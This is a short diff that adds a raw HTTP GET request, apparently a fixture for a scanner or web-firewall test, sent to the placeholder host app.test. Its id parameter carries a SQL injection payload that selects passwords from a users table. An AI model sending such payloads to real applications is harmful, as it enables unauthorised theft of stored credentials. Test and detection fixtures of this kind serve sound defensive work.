@@ -1,0 +1,3 @@
+GET /index.php?id=1 union select password from users HTTP/1.1
+Host: app.test
+User-Agent: scanner
